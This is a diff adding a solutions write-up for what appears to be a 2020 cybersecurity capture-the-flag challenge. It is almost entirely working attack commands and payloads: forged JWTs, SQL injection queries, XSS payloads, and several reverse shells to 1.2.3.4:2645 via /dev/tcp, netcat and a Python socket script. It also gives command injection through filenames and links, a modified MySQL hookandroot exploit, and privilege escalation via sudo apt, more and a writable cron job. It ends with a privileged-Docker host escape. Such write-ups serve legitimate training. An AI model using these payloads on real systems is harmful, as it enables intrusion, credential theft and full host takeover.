@@ -1,0 +1,304 @@
+Cybersec Challenge 2020 | Solutions
+In what follows an IP address of 1.2.3.4 and port number 2645 are used
+for reverse shell examples. Substitute as appropriate.
+
+Unencrypted SSH private key
+For tickets
+There is an unencrypted SSH key on api in ~ec2-user/.ssh/tickets_id_rsa which is authorised to login on tickets as ec2-user.
+
+Lack of authorisation
+On api
+Very few calls to /api validate user privilege, so any user can modify any other user or ticket.
+
+JWT signature not verified
+On admin
+Go to jwt.io and create a new JWT token for an admin user:
+
+Header:
+
+{
+    "alg": "HS256",
+    "typ": "JWT"
+}
+Payload:
+
+{
+    "sub": "aura",
+    "exp": 9999999999,
+    "iat": 1516239022
+}
+Just use it, the signature can be whatever.
+
+JWT key confusion
+On admin
+Note that the signature of the JWT is not verified at all at first (another vulnerability), so you can trivially login as an admin. If that has been fixed, then key confusion attack is possible.
+
+Retrieve the public key used:
+
+curl -s -x socks5://localhost:2872 https://TARGET.cybersecuritychallenge-finale.nz/admin/.well-known/jwks.json
+Copy the n value, which is the Base64 of the RSA key modulus and replace the URI-safe charset of Base64 with the traditional charset of Base64:
+
+res=$(sed 's/-/+/g;s/_/\//g' <<<"BASE64 OF MODULUS")
+n=$(( 4 - (${#res} % 4) ))
+echo -n "${res}"; printf "%0.s=" $(seq 1 $n);
+Paste the output from above into the "Modulus" part of this XML to PEM online converter (the exponent is the same as the default one, AQAB), and save the PEM key as key.pem. Make sure there is a \n at the end, but no blank line.
+
+Go to jwt.io and create a new JWT token for an admin user:
+
+Header:
+
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+Payload:
+
+{
+  "sub": "aura",
+  "exp": 9999999999,
+  "iat": 1516239022
+}
+In the "Verify signature" section tick "secret base64 encoded" and replace "your-256-bit-secret" with the Base64 of the public key (exactly as is):
+
+base64 < key.pem
+Copy the resigned token and use it :)
+
+SQLi
+On api via injection
+Every api request is vulnerable to SQLi, such as:
+
+curl -s -x socks5://localhost:2872 'https://TARGET.cybersecuritychallenge-finale.nz/api/tickets/XXX" UNION SELECT hash, 2, 3, 4 FROM auth JOIN users ON users.id = auth.id WHERE users.username = "TARGET' -H 'Cookie: authorization=COOKIE'
+The password hash is in the id parameter ;)
+
+On api via the SQL box
+There is an SQL box that admins can see and use on the frontend.
+
+curl -s -x socks5://localhost:2872 'https://TARGET.cybersecuritychallenge-finale.nz/api/admin/sqlbox' -H 'Cookie: authorization=COOKIE' -d 'query=select @@version'
+XSS
+On admin via a message
+Submit a ticket with the following title or message:
+
+<script>YOUR XSS TOKEN=1</script>
+On tickets via a message
+Submit a ticket with the following message:
+
+<details ontoggle="YOUR XSS TOKEN=1" open>
+On tickets via patch notes
+Add a patch note (by exploiting SQLi or authorisation issues) with the following as the message:
+
+<details ontoggle="YOUR XSS TOKEN=1" open>
+RCE
+On api via CAPTCHA
+exp="var Promise = require('bluebird'); var execAsync = Promise.promisify(require('child_process').exec); execAsync('bash -c \\\"script -qef /dev/null >& /dev/tcp/1.2.3.4/2645 0>&1\\\"');"
+
+for i in {0..10} ; do
+    curl -s -x socks5://localhost:2872 -X POST \
+        'https://TARGET.cybersecuritychallenge-finale.nz/api/users/login' \
+        -H 'Content-Type: application/json' \
+        --data '{"captcha": {"q":"number","a":"'"${exp}"'"}}'
+done
+On api via the Python box
+There is a python box that admins can see and use.
+
+curl -s -x socks5://localhost:2872 'https://TARGET.cybersecuritychallenge-finale.nz/api/admin/python' -H 'Cookie: authorization=COOKIE' -d 'code=import sys; print(sys.version_info)'
+On api via file upload: version 1
+Using a node.js file.
+
+Create a file with the following contents named whatever.jpg:
+
+let a=require("util"),b=a.promisify(require("child_process").exec);b("bash -c 'script -qef >& /dev/tcp/1.2.3.4/2645 0>&1'").catch(()=>{});
+Upload it:
+
+curl -s -x socks5://localhost:2872 'https://TARGET.cybersecuritychallenge-finale.nz/api/users/image' -H 'Cookie: authorization=COOKIE' -d "filename=../whatever.jpg.js&blob=`cat whatever.jpg | base64 | sed 's/+/%2D/g; s/\//%2F/g; s/=/%3D/g'`"
+On api via file upload: version 2
+Using a file with bash escape characters in the filename.
+
+Base64 your reverse shell payload like such:
+
+echo -n "script -qef >& /dev/tcp/1.2.3.4/2645 0>&1" | base64
+Upload an image with a bach command in the filename which decodes and runs it:
+
+curl -s -x socks5://localhost:2872 'https://TARGET.cybersecuritychallenge-finale.nz/api/users/image' -H 'Cookie: authorization=COOKIE' -d 'filename=../asdf$(bash -c "$(echo MY BASE64 PAYLOAD | base64 -d)").png.js&blob=asdf'
+On api via FTP
+You first need a shell on another host.
+
+On one of the hosts, put lftp
+
+If root, just install it:
+
+apt-get install lftp
+or
+
+yum install lftp
+Otherwise if non-root, download it to /tmp:
+
+cd /tmp
+apt download lftp
+dpkg-deb -x lftp_VERSION_amd64.deb lftp
+check with:
+
+./lftp/usr/bin/lftp
+Create a reverse shell file for node.js:
+
+some_random_name.js:
+
+var Promise = require('bluebird');
+var execAsync = Promise.promisify(require('child_process').exec);
+execAsync("bash -c 'script -qef >& /dev/tcp/1.2.3.4/2645 0>&1'");
+Drop a node.js file in anon (which is actually the root of the node.js API):
+
+lftp -c 'open api; user ftp ""; cd anon; put some_random_name.js'
+On validator via command injection
+Submit a ticket with the following link in the body:
+
+Version 1:
+
+https://'    ''    whatever;    bash    -c    's=$(printf    \\x2f);    target=${s}dev${s}tcp${s}1.2.3.4${s}2645;    script    -qef    >&    $target    0>&1    &    sleep    1;    disown    -h    %%';    awk    -v    link='
+Version 2 (needs nc installed in the docker container):
+
+https://'    ''    whatever;    bash    -c    'cd    $(printf    \\x2f)tmp;    rm    -f    myf;    mkfifo    myf;    cat    myf    |    script    -qef    2>&1    |    nc    1.2.3.4    2645    &>myf    &    sleep    1;    disown    -h    %%';    awk    -v    link='
+Note that the above has only tabs, no spaces! I.e.:
+
+https://'TAB''TABwhatever;TAB... 
+This is because the /admin/js/main.js extracts hostnames from links based on the regex /https?:\/\/[^\/ ]+/g, stopping at a slash or space (but not tab).
+
+Start a listener on 2645:
+
+nc -l 1.2.3.4 2645
+Wait for an admin (i.e. our automated checker) to view the tickets :)
+
+On admin via log injection
+Write a simple reverse shell that we'll use as a hook:
+
+def revshell_myname_or_random_str():
+import socket
+import subprocess
+import os
+
+pid = os.fork()
+if pid != 0:
+   return
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(120)
+s.connect(("1.2.3.4", 2645))
+while True:
+    s.send(b'$ ')
+    cmd = s.recv(256 * 1024).decode('utf-8').strip('\n').strip('\r')
+    if not cmd or cmd == 'exit':
+        break
+    res = subprocess.check_output(
+        '{}; exit 0'.format(cmd),
+        stderr=subprocess.STDOUT,
+        shell=True)
+    s.send(res)
+s.close()
+Send it as is (raw data) in the body of a request (doesn't need to be a valid or authorised request), so it gets written to the log file:
+
+curl -s -x socks5://localhost:2872 -F data=\@/path/to/revshell.py 'https://TARGET.cybersecuritychallenge-finale.nz/admin/'
+Add it as a hook (now you need to be authenticated):
+
+curl -s -x socks5://localhost:2872 -X PUT -d '{"path": "/var/log/tickets/request.log"}' -H 'Authorization: Bearer JWT' -H 'Content-Type: application/json' 'https://TARGET.cybersecuritychallenge-finale.nz/admin/api/hook/revshell_myname_or_random_str'
+Start a listener (IPv4):
+
+nc -l -4 1.2.3.4 2645
+Run the shell, which will connect to your listener:
+
+curl -s -x socks5://localhost:2872 -X POST -d '{"hooks": ["revshell_myname_or_random_str"]}' -H 'Authorization: Bearer JWT' -H 'Content-Type: application/json' 'https://TARGET.cybersecuritychallenge-finale.nz/admin/api/hooks/'
+On db via SQLi
+Using this PoC for 2016-6662
+
+Download mysql_hookandroot_lib.c
+Edit the following lines near the top:
+
+--- a/mysql_hookandroot_lib.c    2017-01-14 18:03:20.000000000 +1300
++++ b/mysql_hookandroot_lib.c    2020-06-11 08:56:09.000000000 +1200
+@@ -63,3 +63,3 @@
+-#define ATTACKERS_IP "127.0.0.1"
+-#define SHELL_PORT 6033
+-#define INJECTED_CONF "/var/lib/mysql/my.cnf"
++#define ATTACKERS_IP "1.2.3.4"
++#define SHELL_PORT 2645
++#define INJECTED_CONF "/etc/my.cnf"
+Compile it:
+
+gcc -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl
+Convert it to hex (copy or save for later):
+
+xxd -p mysql_hookandroot_lib.so | tr -d \\n > mysql_hookandroot_lib.hex
+Start a listener on the port the reverse shell will connect to:
+
+nc -l -k 1.2.3.4 2645
+Inject the following statements via SQLi:
+
+select unhex('{THE HEX PAYLOAD HERE}') into dumpfile '/var/lib/mysql/mysql_hookandroot_lib.so';
+set global general_log_file='/etc/my.cnf';
+set global general_log = on;
+Note that the conf setting in the original PoC uses the [mysqld] section and the malloc_lib setting, which doesn't work, use this:
+
+select "
+
+[mysqld_safe]
+malloc-lib='/var/lib/mysql/mysql_hookandroot_lib.so'
+
+[abyss]
+";
+set global general_log = off;
+shutdown;
+Wait for your shell ;)
+
+Privesc
+On api via apt
+After getting a shell, run
+
+sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i"
+On validator via more
+After getting a shell (see RCE on validator via command injection), upgrade it to an interactive one via script -qef.
+Make the terminal window very short (5 lines should be small enough).
+Run sudo more /var/log/php7.3-fpm.log (inside the script session).
+If the terminal is shorter than the number of lines in the file, a "More" prompt will appear at the bottom. Now you can type !bash to get a root shell.
+On tickets via cron
+All hosts have a cron job which runs /infosec-tip.sh every minute. The script is owned by ec2-user and writable to it.
+
+echo "bash -c 'script -qef >& /dev/tcp/1.2.3.4/2645 0>&1 & sleep 1; disown -h %%'" > /infosec-tip.sh
+Docker escape
+Get the docker client (by installing it from the distro's repositories if available, or downloading it from somewhere else). Otherwise, you need python.
+
+Case 1: use python (examples given for python3)
+
+do apt install python3-pip
+do pip3 install docker, see docker-py
+start an interactive privileged container
+
+do pip3 install dockerpty, see dockerpty, and then:
+
+python3 -c '
+import docker, dockerpty
+client = docker.from_env()
+container = client.images.pull("busybox:latest")
+container = client.containers.create(
+    image="busybox:latest",
+    stdin_open=True,
+    tty=True,
+    privileged=True,
+    command="/bin/sh")
+dockerpty.start(
+    client.api,
+    container.id)'
+Case 2: use the binary package
+
+do apt install wget
+download the package for the distro, e.g. if Debian buster do:
+
+wget https://download.docker.com/linux/debian/dists/buster/pool/stable/amd64/docker-ce-cli_19.03.8~3-0~debian-buster_amd64.deb
+extract it:
+
+dpkg -x docker-ce-cli_19.03.8~3-0~debian-buster_amd64.deb docker-cli
+start an interactive privileged container:
+
+docker-cli/usr/bin/docker run --privileged --rm -ti busybox sh
+Now that we're inside a privileged container, escape to host system as root:
+
+/ # mkdir /rootfs
+/ # mount /dev/xvda1 /rootfs/
+/ # chroot /rootfs/
+[root@13fb63b08b9b /]# source /etc/profile
